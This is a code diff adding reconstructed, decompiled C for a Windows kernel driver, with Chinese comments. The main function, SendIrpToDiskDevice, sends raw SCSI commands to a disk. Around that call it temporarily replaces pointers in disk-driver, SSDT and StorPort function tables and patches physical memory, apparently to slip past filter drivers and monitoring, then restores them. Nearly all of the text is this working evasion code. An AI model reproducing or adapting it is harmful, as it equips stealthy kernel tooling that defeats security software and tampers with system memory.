@@ -3297,10 +3297,482 @@ __int64 __fastcall IrpFsctlGetVolumeData(void *FileHandle, __int64 *pVolumeData)
     return IrpFileSystemControl(FileHandle, (struct _IRP *)&VolumeData, 8u, 0xEu);
 }
 
-// SendIrpToDiskDevice — 发送 IRP 到磁盘设备
-__int64 SendIrpToDiskDevice(struct _DEVICE_OBJECT *DeviceObject, int Command, void *Buffer, int SectorCount, int BlockSize, int BlockCount)
+// SaveAndReplaceDiskExtension — 保存并替换磁盘扩展结构
+// 对应原始驱动 sub_14007D024
+// 全局表 0x2FF 置位时取扩展结构（全局表 0x1076），校验字段 181/180 后，
+// 把目标对象偏移 232 处的原指针存入 pSavedPointer，并原子替换为扩展结构中的新指针
+char SaveAndReplaceDiskExtension(__int64 TargetObject, _QWORD *pSavedPointer)
 {
-    return -1073741670;
+    char Result;
+    __int64 *Extension;
+    __int64 OriginalPointer;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField49))
+    {
+        Extension = GtAlloc((GLOBAL_TABLE_INDEX)(GtEprocessField108 | 0x1000));
+        if (*((_DWORD *)Extension + 181))
+        {
+            if (*((_DWORD *)Extension + 180) == 1)
+            {
+                OriginalPointer = *(_QWORD *)(TargetObject + 232);
+                if (Extension[91] != OriginalPointer)
+                {
+                    *pSavedPointer = OriginalPointer;
+                    Result = 1;
+                    InterlockedExchange64((volatile __int64 *)(TargetObject + 232), Extension[91]);
+                }
+            }
+        }
+    }
+    return Result;
+}
+
+// SaveAndReplaceDiskExtension2 — 保存并替换磁盘扩展结构版本2
+// 对应原始驱动 sub_14007D09C
+// 与版本1同构，改用全局表 0x2FA 开关与 0xFC2 扩展结构，作用于目标对象偏移 96（字段 337/336、索引 169）
+char SaveAndReplaceDiskExtension2(__int64 TargetObject, _QWORD *pSavedPointer)
+{
+    char Result;
+    __int64 *Extension;
+    __int64 OriginalPointer;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField44))
+    {
+        Extension = GtAlloc((GLOBAL_TABLE_INDEX)0xFC2);
+        if (*((_DWORD *)Extension + 337))
+        {
+            if (*((_DWORD *)Extension + 336) == 1)
+            {
+                OriginalPointer = *(_QWORD *)(TargetObject + 96);
+                if (Extension[169] != OriginalPointer)
+                {
+                    *pSavedPointer = OriginalPointer;
+                    Result = 1;
+                    InterlockedExchange64((volatile __int64 *)(TargetObject + 96), Extension[169]);
+                }
+            }
+        }
+    }
+    return Result;
+}
+
+// SaveAndReplaceDiskExtension3 — 保存并替换磁盘扩展结构版本3
+// 对应原始驱动 sub_14007D168
+// 与版本2同用 0x2FA 开关与 0xFC2 扩展结构，但作用于目标对象偏移 232（字段 181/180、索引 91）
+char SaveAndReplaceDiskExtension3(__int64 TargetObject, _QWORD *pSavedPointer)
+{
+    char Result;
+    __int64 *Extension;
+    __int64 OriginalPointer;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField44))
+    {
+        Extension = GtAlloc((GLOBAL_TABLE_INDEX)0xFC2);
+        if (*((_DWORD *)Extension + 181))
+        {
+            if (*((_DWORD *)Extension + 180) == 1)
+            {
+                OriginalPointer = *(_QWORD *)(TargetObject + 232);
+                if (Extension[91] != OriginalPointer)
+                {
+                    *pSavedPointer = OriginalPointer;
+                    Result = 1;
+                    InterlockedExchange64((volatile __int64 *)(TargetObject + 232), Extension[91]);
+                }
+            }
+        }
+    }
+    return Result;
+}
+
+// SaveAndReplaceDiskExtension4 — 保存并替换磁盘扩展结构版本4
+// 对应原始驱动 sub_14007D2A4
+// 改用全局表 0x30B 开关与 0x1124 扩展结构，作用于目标对象偏移 232（字段 181/180、索引 91）
+char SaveAndReplaceDiskExtension4(__int64 TargetObject, _QWORD *pSavedPointer)
+{
+    char Result;
+    __int64 *Extension;
+    __int64 OriginalPointer;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField61))
+    {
+        Extension = GtAlloc((GLOBAL_TABLE_INDEX)0x1124);
+        if (*((_DWORD *)Extension + 181))
+        {
+            if (*((_DWORD *)Extension + 180) == 1)
+            {
+                OriginalPointer = *(_QWORD *)(TargetObject + 232);
+                if (Extension[91] != OriginalPointer)
+                {
+                    *pSavedPointer = OriginalPointer;
+                    Result = 1;
+                    InterlockedExchange64((volatile __int64 *)(TargetObject + 232), Extension[91]);
+                }
+            }
+        }
+    }
+    return Result;
+}
+
+// SaveAndReplaceDiskExtension5 — 保存并替换磁盘扩展结构版本5
+// 对应原始驱动 sub_14007D31C
+// 与版本4同用 0x30B 开关与 0x1124 扩展结构，但作用于目标对象偏移 96（字段 337/336、索引 169）
+char SaveAndReplaceDiskExtension5(__int64 TargetObject, _QWORD *pSavedPointer)
+{
+    char Result;
+    __int64 *Extension;
+    __int64 OriginalPointer;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField61))
+    {
+        Extension = GtAlloc((GLOBAL_TABLE_INDEX)0x1124);
+        if (*((_DWORD *)Extension + 337))
+        {
+            if (*((_DWORD *)Extension + 336) == 1)
+            {
+                OriginalPointer = *(_QWORD *)(TargetObject + 96);
+                if (Extension[169] != OriginalPointer)
+                {
+                    *pSavedPointer = OriginalPointer;
+                    Result = 1;
+                    InterlockedExchange64((volatile __int64 *)(TargetObject + 96), Extension[169]);
+                }
+            }
+        }
+    }
+    return Result;
+}
+
+// 以下 7 个为 SendIrpToDiskDevice 使用的磁盘扩展辅助函数
+// LookupStorPortFunctionTable — 查找 StorPort 函数表
+// 对应原始驱动 sub_14007D10C
+// 开关 0x2FA 置位且索引不超过 0x1C 时，把索引处的 16 字节函数表与 a2 原子交换
+char LookupStorPortFunctionTable(unsigned int Index, _OWORD *ExchangeData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField44) && Index <= 0x1C)
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0xFC2);
+        return AtomicExchange16Bytes((__int64)&Table[6 * Index], ExchangeData);
+    }
+    return Result;
+}
+
+// LookupStorPortFunctionTable2 — 查找 StorPort 函数表版本2
+// 对应原始驱动 sub_14007D248
+// 与版本1同构，开关改用 0x30B、缓冲索引改用 0x1124
+char LookupStorPortFunctionTable2(unsigned int Index, _OWORD *ExchangeData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if ((unsigned int)GtRead(GtCallbackField61) && Index <= 0x1C)
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0x1124);
+        return AtomicExchange16Bytes((__int64)&Table[6 * Index], ExchangeData);
+    }
+    return Result;
+}
+
+// QueryDiskExtensionFunctionTable — 查询磁盘扩展函数表
+// 对应原始驱动 sub_14007D1E0
+// 开关 0x2F3 置位且缓冲字段校验通过时，先把预设值取出写到 a2，再把 a1 原子交换进该槽位
+char QueryDiskExtensionFunctionTable(_OWORD *ExchangeData, _QWORD *pPresetValue)
+{
+    char Result;
+    __int64 *Table;
+    _DWORD *Slot;
+
+    Result = 0;
+    *pPresetValue = 0;
+    if ((unsigned int)GtRead(GtCallbackField37))
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0xF0F);
+        Slot = (_DWORD *)(Table + 90);
+        if (*((_DWORD *)Table + 181))
+        {
+            if (*Slot == 1)
+            {
+                *pPresetValue = Table[91];
+                return AtomicExchange16Bytes((__int64)Slot, ExchangeData);
+            }
+        }
+    }
+    return Result;
+}
+
+// SaveDiskDeviceContextByIndex — 按索引保存磁盘设备上下文
+// 对应原始驱动 sub_14007D38C
+// 索引为 1 且开关 0x2FF 置位时，把 a2 原子写入缓冲偏移 720 处
+char SaveDiskDeviceContextByIndex(char Index, _OWORD *ContextData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if (Index == 1 && (unsigned int)GtRead(GtCallbackField49))
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)(GtEprocessField108 | 0x1000));
+        return AtomicWrite16Bytes((ULONG64)(Table + 90), ContextData);
+    }
+    return Result;
+}
+
+// SaveDiskDeviceContextByIndexV2 — 按索引保存磁盘设备上下文版本2
+// 对应原始驱动 sub_14007D438
+// 与版本1同构，开关改用 0x2F3、缓冲索引改用 0xF0F
+char SaveDiskDeviceContextByIndexV2(char Index, _OWORD *ContextData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if (Index == 1 && (unsigned int)GtRead(GtCallbackField37))
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0xF0F);
+        return AtomicWrite16Bytes((ULONG64)(Table + 90), ContextData);
+    }
+    return Result;
+}
+
+// SaveDiskDeviceContextByIndexEx — 按索引保存磁盘设备上下文扩展
+// 对应原始驱动 sub_14007D3D8
+// 索引为 1、开关 0x2FA 置位且条目索引不超过 0x1C 时，把 a3 原子写入对应 16 字节槽位
+char SaveDiskDeviceContextByIndexEx(char Index, unsigned int EntryIndex, _OWORD *ContextData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if (Index == 1 && (unsigned int)GtRead(GtCallbackField44) && EntryIndex <= 0x1C)
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0xFC2);
+        return AtomicWrite16Bytes((ULONG64)&Table[6 * EntryIndex], ContextData);
+    }
+    return Result;
+}
+
+// SaveDiskDeviceContextByIndexV3 — 按索引保存磁盘设备上下文版本3
+// 对应原始驱动 sub_14007D484
+// 与扩展版同构，开关改用 0x30B、缓冲索引改用 0x1124
+char SaveDiskDeviceContextByIndexV3(char Index, unsigned int EntryIndex, _OWORD *ContextData)
+{
+    char Result;
+    __int64 *Table;
+
+    Result = 0;
+    if (Index == 1 && (unsigned int)GtRead(GtCallbackField61) && EntryIndex <= 0x1C)
+    {
+        Table = GtAlloc((GLOBAL_TABLE_INDEX)0x1124);
+        return AtomicWrite16Bytes((ULONG64)&Table[6 * EntryIndex], ContextData);
+    }
+    return Result;
+}
+
+// SendIrpToDiskDevice — 发送 IRP 到磁盘设备
+// 对应原始驱动 sub_14007AF28
+// 构造 0x58 字节 SCSI/ATA 命令描述块（CDB）+ 0x12 字节从属缓冲，分配并锁定 MDL，
+// 初始化内部设备控制 IRP（MajorFunction=0x0F，完成例程 CompleteIrpAndCleanupMdl），
+// 随后临时替换磁盘驱动/SSDT/StorPort 各处函数表与物理内存指针，下发 IRP，再逐一恢复原位
+__int64 SendIrpToDiskDevice(struct _DEVICE_OBJECT *DeviceObject, int Command, void *Buffer, int SectorIndex, int BlockSize, int BlockCount)
+{
+    unsigned int Result;
+    unsigned int TransferSize;
+    int CdbSize;
+    char *CdbContext;
+    _QWORD *AuxBuffer;
+    IRP *Irp;
+    struct _MDL *Mdl;
+    struct _IO_STACK_LOCATION *StackLocation;
+    __int64 DiskDeviceContext;
+    __int64 SsdtFunctionBase;
+    _QWORD *DiskDriverSection;
+    char RestoreState1, RestoreState2, RestoreState3, RestoreState4, RestoreState5;
+    char RestoreState6, RestoreState7, RestoreState8, RestoreState9, RestoreState10;
+    char RestoreState11;
+    int CallStatus;
+    __int64 SavedTable1, SavedTable2, SavedTable3, SavedTable4, SavedTable5;
+    struct _KEVENT Event;
+    char IoStatusBuffer;
+    _OWORD FunctionTable1, FunctionTable2, FunctionTable3, FunctionTable4, FunctionTable5, FunctionTable6;
+    __int64 (*pCallDriver)(__int64, ULONG_PTR, __int64);
+    ULONG_PTR IrpAddress;
+
+    pCallDriver = (__int64 (__fastcall *)(__int64, ULONG_PTR, __int64))DeviceObject;
+    Result = 0xC000009A;
+    SavedTable1 = 0;
+    SavedTable2 = 0;
+    SavedTable3 = 0;
+    SavedTable4 = 0;
+    SavedTable5 = 0;
+
+    CdbContext = (char *)ExAlloc(NonPagedPool, 0x58);
+    if (!CdbContext)
+        return Result;
+
+    AuxBuffer = (_QWORD *)ExAlloc(NonPagedPool, 0x12);
+    if (!AuxBuffer)
+    {
+        ExFree(CdbContext);
+        return Result;
+    }
+
+    memset(CdbContext, 0, 0x58);
+    AuxBuffer[0] = 0;
+    AuxBuffer[1] = 0;
+    *((_WORD *)AuxBuffer + 8) = 0;
+
+    *(_WORD *)CdbContext = 88;
+    *((_QWORD *)CdbContext + 3) = (ULONG64)Buffer;
+    TransferSize = (unsigned int)(BlockSize * BlockCount);
+    *((_DWORD *)CdbContext + 4) = TransferSize;
+    *(_WORD *)(CdbContext + 9) = 2592;
+    *((_QWORD *)CdbContext + 4) = (ULONG64)AuxBuffer;
+    CdbContext[11] = 18;
+    CdbSize = 160;
+    if (Command == 3)
+        CdbSize = 608;
+    *((_DWORD *)CdbContext + 3) = CdbSize;
+    *((_DWORD *)CdbContext + 5) = (TransferSize >> 10) + 1;
+    *((_DWORD *)CdbContext + 16) = SectorIndex;
+    CdbContext[72] = (char)(2 * (Command + 17));
+    CdbContext[73] = (char)((CdbContext[73] & 0x1F) | 0x80);
+    CdbContext[74] = HIBYTE(SectorIndex);
+    CdbContext[75] = BYTE2(SectorIndex);
+    CdbContext[76] = BYTE1(SectorIndex);
+    CdbContext[77] = (char)SectorIndex;
+    CdbContext[79] = BYTE1(BlockSize);
+    CdbContext[80] = (char)BlockSize;
+
+    Irp = IoAllocateIrp(DeviceObject->StackSize, 0);
+    if (!Irp)
+    {
+        ExFree(AuxBuffer);
+        ExFree(CdbContext);
+        return Result;
+    }
+    IrpAddress = (ULONG_PTR)Irp;
+
+    Mdl = IoAllocateMdl(Buffer, TransferSize, 0, 0, Irp);
+    if (!Mdl)
+    {
+        IoFreeIrp(Irp);
+        ExFree(AuxBuffer);
+        ExFree(CdbContext);
+        return Result;
+    }
+
+    MmProbeAndLockPages(Mdl, 0, (LOCK_OPERATION)(Command != 3));
+    KeInitializeEvent(&Event, NotificationEvent, 0);
+
+    StackLocation = Irp->Tail.Overlay.CurrentStackLocation;
+    StackLocation[-1].CompletionRoutine = (PIO_COMPLETION_ROUTINE)CompleteIrpAndCleanupMdl;
+    StackLocation[-1].Context = CdbContext;
+    StackLocation[-1].Control = (char)0xE0;
+    *((_QWORD *)CdbContext + 6) = (ULONG64)Irp;
+    Irp->MdlAddress = Mdl;
+    Irp->Flags = 5;
+    Irp->RequestorMode = 0;
+    Irp->UserIosb = (PIO_STATUS_BLOCK)&IoStatusBuffer;
+    Irp->UserEvent = &Event;
+    Irp->Cancel = 0;
+    Irp->CancelRoutine = 0;
+    Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
+    Irp->IoStatus.Status = 0;
+    Irp->IoStatus.Information = 0;
+    Irp->AssociatedIrp.MasterIrp = 0;
+
+    StackLocation = Irp->Tail.Overlay.CurrentStackLocation;
+    StackLocation[-1].MajorFunction = 15;
+    StackLocation[-1].DeviceObject = DeviceObject;
+    StackLocation[-1].Parameters.WMI.ProviderId = (ULONG_PTR)CdbContext;
+
+    DiskDeviceContext = DecryptDiskDeviceContextStr();
+    SsdtFunctionBase = GetSsdtFunctionBase4();
+    DiskDriverSection = GetDiskDriverSection();
+
+    if (DiskDeviceContext)
+    {
+        RestoreState7 = SaveAndReplaceDiskExtension3(DiskDeviceContext, (_QWORD *)&SavedTable1);
+        RestoreState8 = SaveAndReplaceDiskExtension2(DiskDeviceContext, (_QWORD *)&SavedTable2);
+    }
+    if (SsdtFunctionBase)
+        RestoreState1 = SaveAndReplaceDiskExtension(SsdtFunctionBase, (_QWORD *)&SavedTable5);
+    if (DiskDriverSection)
+    {
+        RestoreState4 = SaveAndReplaceDiskExtension4((__int64)DiskDriverSection, (_QWORD *)&SavedTable4);
+        RestoreState6 = SaveAndReplaceDiskExtension5((__int64)DiskDriverSection, (_QWORD *)&SavedTable3);
+    }
+
+    RestoreState11 = QueryDiskExtensionFunctionTable(&FunctionTable2, (_QWORD *)&pCallDriver);
+    RestoreState2 = LookupStorPortFunctionTable(0xF, &FunctionTable5);
+    RestoreState3 = LookupStorPortFunctionTable(0x1C, &FunctionTable1);
+    RestoreState9 = DispatchStorPortIoControl(&FunctionTable6);
+    RestoreState5 = LookupStorPortFunctionTable2(0xF, &FunctionTable4);
+    RestoreState10 = LookupStorPortFunctionTable2(0x1C, &FunctionTable3);
+    RestoreState1 = SwapPhysicalMemoryQword(GtCallbackField38, GtCallbackField39);
+    RestoreState2 = SwapPhysicalMemoryQword(GtCallbackField45, GtCallbackField46);
+    RestoreState3 = SwapPhysicalMemoryQword(GtCallbackField50, GtCallbackField51);
+    RestoreState4 = SwapPhysicalMemoryQword(GtCallbackField62, GtCallbackField63);
+    RestoreState5 = SwapDiskIrpFunctionPointer();
+
+    CallStatus = (int)AllocateIrpStackAndCallDriver(pCallDriver, (__int64)DeviceObject, IrpAddress);
+
+    SaveDiskDeviceContextByIndexV3(RestoreState10, 0x1C, &FunctionTable3);
+    SaveDiskDeviceContextByIndexV3(RestoreState5, 0xF, &FunctionTable4);
+    SaveDiskDeviceContextByIndex(RestoreState9, &FunctionTable6);
+    SaveDiskDeviceContextByIndexEx(RestoreState3, 0x1C, &FunctionTable1);
+    SaveDiskDeviceContextByIndexEx(RestoreState2, 0xF, &FunctionTable5);
+    SaveDiskDeviceContextByIndexV2(RestoreState11, &FunctionTable2);
+
+    Result = (unsigned int)CallStatus;
+    if (CallStatus == 259)
+        KeWaitForSingleObject(&Event, Executive, 0, 0, 0);
+
+    if (RestoreState1 == 1)
+        WritePhysicalMemoryFromGt(GtCallbackField38, GtCallbackField39);
+    if (RestoreState2 == 1)
+        WritePhysicalMemoryFromGt(GtCallbackField45, GtCallbackField46);
+    if (RestoreState3 == 1)
+        WritePhysicalMemoryFromGt(GtCallbackField50, GtCallbackField51);
+    if (RestoreState4 == 1)
+        WritePhysicalMemoryFromGt(GtCallbackField62, GtCallbackField63);
+    RestoreDiskIrpFunctionPointer(RestoreState5);
+
+    if (DiskDeviceContext)
+    {
+        if (RestoreState7 == 1)
+            InterlockedExchange64((volatile __int64 *)(DiskDeviceContext + 232), SavedTable1);
+        if (RestoreState8 == 1)
+            InterlockedExchange64((volatile __int64 *)(DiskDeviceContext + 96), SavedTable2);
+    }
+    if (SsdtFunctionBase && RestoreState1 == 1)
+        InterlockedExchange64((volatile __int64 *)(SsdtFunctionBase + 232), SavedTable5);
+    if (DiskDriverSection)
+    {
+        if (RestoreState4 == 1)
+            InterlockedExchange64((volatile __int64 *)(DiskDriverSection + 29), SavedTable4);
+        if (RestoreState6 == 1)
+            InterlockedExchange64((volatile __int64 *)(DiskDriverSection + 12), SavedTable3);
+    }
+
+    if (*((_QWORD *)CdbContext + 4) != (ULONG64)AuxBuffer && *((_QWORD *)CdbContext + 4))
+        ExFreePoolWithTag((PVOID)*((_QWORD *)CdbContext + 4), 0);
+    if (CallStatus >= 0)
+        Result = 0;
+
+    ExFree(AuxBuffer);
+    ExFree(CdbContext);
+    return Result;
 }
 
 // CdbCommandCompletionCallback — CDB 命令完成回调：释放 IRP 缓冲区，恢复当前线程标志位，调用完成通知回调
